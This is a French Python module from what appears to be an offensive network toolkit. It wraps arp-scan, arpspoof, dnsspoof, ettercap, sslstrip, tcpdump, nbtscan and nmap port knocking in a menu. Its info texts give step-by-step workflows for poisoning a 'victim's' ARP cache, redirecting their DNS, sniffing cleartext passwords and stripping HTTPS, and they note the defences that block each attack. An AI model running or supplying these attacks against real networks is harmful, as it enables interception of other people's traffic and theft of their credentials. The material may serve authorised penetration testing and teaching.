"""Réseau LAN — 8 actions."""

from core import ui, runner


def arp_scan():
    ui.header("ARP scan — découverte LAN")
    if not runner.check_tools(["arp-scan"]): ui.pause(); return
    iface = ui.ask("interface", default="eth0")
    runner.run(["arp-scan", "-I", iface, "--localnet"], tag="arp-scan", root=True)
    ui.pause()


def arp_spoof():
    ui.header("ARP spoof — empoisonner cache victime")
    if not runner.check_tools(["arpspoof"]): ui.pause(); return
    iface  = ui.ask("interface", default="eth0")
    victim = ui.ask("IP victime"); gw = ui.ask("IP gateway")
    if not (victim and gw): ui.pause(); return
    ui.warn("Active forwarding : sudo sysctl -w net.ipv4.ip_forward=1\n")
    runner.run(["arpspoof", "-i", iface, "-t", victim, "-r", gw], tag="arpspoof", root=True)
    ui.pause_with_analysis()


def dns_spoof():
    ui.header("DNS spoof (dnsspoof)")
    if not runner.check_tools(["dnsspoof"]): ui.pause(); return
    iface = ui.ask("interface", default="eth0")
    hf    = ui.ask("fichier hosts (ex: hosts.txt)")
    if not hf: ui.pause(); return
    runner.run(["dnsspoof", "-i", iface, "-f", hf], tag="dnsspoof", root=True)
    ui.pause()


def mitm_ettercap():
    ui.header("Ettercap — MITM ARP poisoning")
    if not runner.check_tools(["ettercap"]): ui.pause(); return
    iface  = ui.ask("interface", default="eth0")
    target = ui.ask("cible (IP) — vide=tous", default="")
    args = ["ettercap", "-T", "-q", "-i", iface, "-M", "arp:remote"]
    if target: args += [f"/{target}//", "//"]
    runner.run(args, tag="ettercap", root=True)
    ui.pause_with_analysis()


def sslstrip():
    ui.header("SSLstrip")
    if not runner.check_tools(["sslstrip"]): ui.pause(); return
    port = ui.ask("port", default="10000")
    runner.run(["sslstrip", "-l", port], tag="sslstrip", root=True)
    ui.pause()


def packet_capture():
    ui.header("Capture paquets (tcpdump)")
    iface = ui.ask("interface", default="eth0")
    filt  = ui.ask("filtre BPF (vide=tout)", default="")
    out   = ui.ask("fichier .pcap", default="capture.pcap")
    args = ["tcpdump", "-i", iface, "-w", out]
    if filt: args += filt.split()
    runner.run(args, tag="tcpdump", root=True)
    ui.pause_with_analysis()


def netbios_scan():
    ui.header("NetBIOS scan (nbtscan)")
    if not runner.check_tools(["nbtscan"]): ui.pause(); return
    rng = ui.ask("plage IP", default="192.168.1.0/24")
    runner.run(["nbtscan", "-r", rng], tag="nbtscan")
    ui.pause()


def port_knock():
    ui.header("Port knocking (séquence)")
    target = ui.ask("cible (IP)"); seq = ui.ask("séquence ports (ex: 7000,8000,9000)")
    if not (target and seq): ui.pause(); return
    for p in seq.split(","):
        p = p.strip()
        ui.info(f"knock → {target}:{p}")
        runner.run(["nmap", "-Pn", "--max-retries", "0", "-p", p, target],
                   tag=f"knock-{p}", stream=False)
    ui.ok("séquence envoyée"); ui.pause()


ITEMS = [
    {
        "label": "ARP scan LAN", "fn": arp_scan, "status": "ok",
        "info": """Découvre toutes les machines actives du LAN via requêtes ARP.

QUAND       : 1ère étape après connexion au réseau cible (filaire ou WiFi)
PRÉREQUIS   : sudo + être sur le LAN (Ethernet ou WiFi associé)
SORTIE      : MAC | IP | vendor (Apple, Samsung, Dell, etc.)
TIPS        : plus fiable que nmap -sn (pas filtré par FW host)
              Le vendor révèle souvent le type d'appareil (Liteon = laptop, Sony = TV)
LIMITES     : ne sort PAS du subnet local (pas de routage ARP)"""
    },
    {
        "label": "ARP spoof victime", "fn": arp_spoof, "status": "ok",
        "info": """Empoisonne le cache ARP d'une victime → tu deviens son gateway.

WORKFLOW    : 1. sysctl -w net.ipv4.ip_forward=1  (sinon tu coupes son net)
              2. arpspoof -t <victim> -r <gateway>  (-r = bidirectionnel)
              3. Capturer avec tcpdump / urlsnarf / driftnet sur ton iface
RÉSULTAT    : trafic victime ↔ internet passe par TOI
PRÉREQUIS   : sudo, sur même subnet que la victime
LIMITES     :
  - HTTPS chiffre tout → tu vois SNI/IP mais pas le contenu
  - HSTS empêche SSLstrip sur sites majeurs (banques, Google, etc.)
  - DAI (Dynamic ARP Inspection) activé sur switchs pro = bloqué
  - Beaucoup d'OS détectent (Android 12+, iOS, Windows 11 Defender ATP)"""
    },
    {
        "label": "DNS spoof", "fn": dns_spoof, "status": "ok",
        "info": """Répond avec fausses IP aux requêtes DNS de la victime (à utiliser AVEC arpspoof).

WORKFLOW    : 1. Faire ARP spoof d'abord
              2. Préparer hosts.txt : '1.2.3.4  google.com'
              3. Lancer dnsspoof
              4. Victime → google.com → atterrit sur ton 1.2.3.4
LIMITES     :
  - DoH (DNS over HTTPS) bypass complètement (Firefox/Chrome modernes l'utilisent)
  - DoT (DNS over TLS) idem
  - DNSSEC sur domaine signé → réponse rejetée
  - Beaucoup d'OS utilisent DoH par défaut maintenant"""
    },
    {
        "label": "MITM ettercap", "fn": mitm_ettercap, "status": "ok",
        "info": """Ettercap fait ARP poisoning + sniff combiné dans un seul outil.

QUAND       : alternative tout-en-un à arpspoof + tcpdump
SORTIE      : capture passwords clair-texte (FTP, HTTP basic auth, Telnet)
TIPS        : plugins utiles : 'dns_spoof', 'autoadd', 'find_ettercaps'
              GUI graphique disponible : 'ettercap -G'
LIMITES     : idem ARP spoof — HTTPS et DoH cassent l'attaque
              Détectable par tout NIDS basique"""
    },
    {
        "label": "SSLstrip", "fn": sslstrip, "status": "old",
        "info": """Intercepte les redirections HTTP→HTTPS pour forcer la victime à rester en HTTP.

LIMITES (RAISON STATUT 'VIEUX') :
  - HSTS (HTTP Strict Transport Security) bypass complètement :
    le navigateur sait que le site doit être HTTPS et refuse HTTP
  - HSTS preload list contient tous les gros sites depuis 2014
  - HTTP/3 sur QUIC ne passe même pas par TCP donc pas interceptable
  - Marche encore sur petits sites mal configurés (sans HSTS)
ALTERNATIVES : bettercap (sslstrip+ avec HSTS bypass partiel via DNS)"""
    },
    {
        "label": "Capture paquets (tcpdump)", "fn": packet_capture, "status": "tool",
        "info": """Sniff de paquets sur une interface, avec filtre BPF, sortie .pcap.

QUAND       : après ARP spoof / mode monitor / accès à port mirroring
FILTRES BPF UTILES :
  - 'port 80 or port 443'     → web
  - 'host 192.168.1.10'       → trafic d'une machine
  - 'not arp'                 → exclure le bruit ARP
  - 'tcp[tcpflags] & tcp-syn' → SYN scans entrants
TIPS        : ouvrir le .pcap dans Wireshark pour analyse propre
              wireshark capture.pcap
LIMITES     : sans clé TLS, impossible de lire le HTTPS
              (sauf à exporter SSLKEYLOGFILE depuis navigateur cible)"""
    },
    {
        "label": "NetBIOS scan", "fn": netbios_scan, "status": "old",
        "info": """Énumère les noms NetBIOS Windows sur une plage IP.

QUAND       : LAN Windows hérité (Win7/Server 2008)
SORTIE      : NetBIOS name | workgroup | user logged in
LIMITES     :
  - NetBIOS désactivé sur Win10/11 par défaut
  - Replacé par mDNS / WS-Discovery
  - Encore utile sur AD ancien / NAS Linux Samba mal config"""
    },
    {
        "label": "Port knocking", "fn": port_knock, "status": "tool",
        "info": """Envoie une séquence de SYN sur des ports précis pour 'ouvrir' un port caché.

QUAND       : pentest connaissant une séquence valide (config knockd côté serveur)
EXEMPLE     : knock séquence 7000,8000,9000 → ouvre SSH (port 22) pendant 30s
TIPS        : pas une attaque en soi — outil de bypass légitime
              Si tu as la séquence, tu accèdes au service caché"""
    },
]


def menu():
    while True:
        idx = ui.menu("RÉSEAU LAN", ITEMS)
        if idx is None: return
        ITEMS[idx]["fn"]()
